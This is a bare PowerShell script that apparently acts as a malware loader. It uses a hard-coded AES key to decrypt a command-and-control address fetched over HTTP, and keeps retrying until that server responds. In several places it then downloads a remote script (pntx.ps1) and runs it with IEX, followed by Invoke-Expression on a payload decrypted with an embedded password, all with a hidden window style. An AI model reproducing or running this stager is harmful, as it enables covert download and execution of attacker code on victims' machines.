
$keyreadgetC2 = "RQLohv9CMvXMGEkRi3+FSlPuFxz0nYrV3PzOsHRhBE8="
if ($keyreadgetC2.length -eq 43) {$keyreadgetC2 = $keyreadgetC2 + '=' }
if ($keyreadgetC2.length -eq 42) {$keyreadgetC2 = $keyreadgetC2 + '==' }
function Create-AesManagedObject($key, $IV) {
$aesManaged = New-Object "System.Security.Cryptography.AesManaged"
$aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
$aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
$aesManaged.BlockSize = 128
$aesManaged.KeySize = 256
if ($IV) {
if ($IV.getType().Name -eq "String") {
$aesManaged.IV = [System.Convert]::FromBase64String($IV)
}
else {
$aesManaged.IV = $IV
}
}
if ($key) {
if ($key.getType().Name -eq "String") {
$aesManaged.Key = [System.Convert]::FromBase64String($key)
}
else {
$aesManaged.Key = $key
}
}
$aesManaged
}
function Create-AesKey() {
$aesManaged = Create-AesManagedObject
$aesManaged.GenerateKey()
[System.Convert]::ToBase64String($aesManaged.Key)
}
function Encrypt-String($key, $unencryptedString) {
$bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString)
$aesManaged = Create-AesManagedObject $key
$encryptor = $aesManaged.CreateEncryptor()
$encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
[byte[]] $fullData = $aesManaged.IV + $encryptedData
$aesManaged.Dispose()
[System.Convert]::ToBase64String($fullData)
}
function Decrypt-String($key, $encryptedStringWithIV) {
$bytes = [System.Convert]::FromBase64String($encryptedStringWithIV)
$IV = $bytes[0..15]
$aesManaged = Create-AesManagedObject $key $IV
$decryptor = $aesManaged.CreateDecryptor();
$unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
$aesManaged.Dispose()
[System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
}
$WindowStyle ='Hidden'
function TestInternet {
[CmdletBinding()]
param()
process {
[Activator]::CreateInstance([Type]::GetTypeFromCLSID([Guid]'{DCB00C01-570F-4A9B-8D69-199FDBA5723B}')).IsConnectedToInternet
}
}
function TestURLstatus {
[CmdletBinding()] param([string] $URL,[string] $runLocal)
$HTTP_Request = [System.Net.WebRequest]::Create("$URL")
$HTTP_Response = $HTTP_Request.GetResponse()
$HTTP_Status = [int]$HTTP_Response.StatusCode
if ($HTTP_Status -eq 200) {
$True
}
else {
$False
Write-Host "URL unavailable !"
}
$HTTP_Response.Close()
}
$t = TestInternet
if ($t -eq $True) {
$c2cEncrypted = (New-Object System.Net.WebClient).DownloadString("http://127.0.0.1/www/link/c2.txt")
[string] $Global:c2c = Decrypt-String $keyreadgetC2 $c2cEncrypted
$uconnect = TestURLstatus -URL $c2c
if ($uconnect -eq $True) {
IEX((New-Object Net.WebClient).DownloadString("$c2c/www/link/pntx.ps1"))
$decrypted = de pntMagic@2016 R1284S2dZFj
Invoke-Expression $decrypted
}
else{
while ($uconnect -eq $False) {
$c2cEncrypted = (New-Object System.Net.WebClient).DownloadString("http://127.0.0.1/www/link/c2.txt")
[string] $Global:c2c = Decrypt-String $keyreadgetC2 $c2cEncrypted
$uconnect = TestURLstatus -URL $c2c
Start-Sleep -Seconds 10
if ($uconnect -eq $True) {
break
}
}
IEX((New-Object Net.WebClient).DownloadString("$c2c/www/link/pntx.ps1"))
$decrypted = de pntMagic@2016 R1284S2dZFj
Invoke-Expression $decrypted
}
}
else {
while ($t -eq $False) {
$t = TestInternet
Start-Sleep -Seconds 10
if ($t -eq $True) {
break
}
}
$c2cEncrypted = (New-Object System.Net.WebClient).DownloadString("http://127.0.0.1/www/link/c2.txt")
[string] $Global:c2c = Decrypt-String $keyreadgetC2 $c2cEncrypted
$uconnect = TestURLstatus -URL $c2c
if ($uconnect -eq $True) {
IEX((New-Object Net.WebClient).DownloadString("$c2c/www/link/pntx.ps1"))
$decrypted = de pntMagic@2016 R1284S2dZFj
Invoke-Expression $decrypted
}
else{
while ($uconnect -eq $False) {
$c2cEncrypted = (New-Object System.Net.WebClient).DownloadString("http://127.0.0.1/www/link/c2.txt")
[string] $Global:c2c = Decrypt-String $keyreadgetC2 $c2cEncrypted
$uconnect = TestURLstatus -URL $c2c
Start-Sleep -Seconds 10
if ($uconnect -eq $True) {
break
}
}
IEX((New-Object Net.WebClient).DownloadString("$c2c/www/link/pntx.ps1"))
$decrypted = de pntMagic@2016 R1284S2dZFj
Invoke-Expression $decrypted
}
}

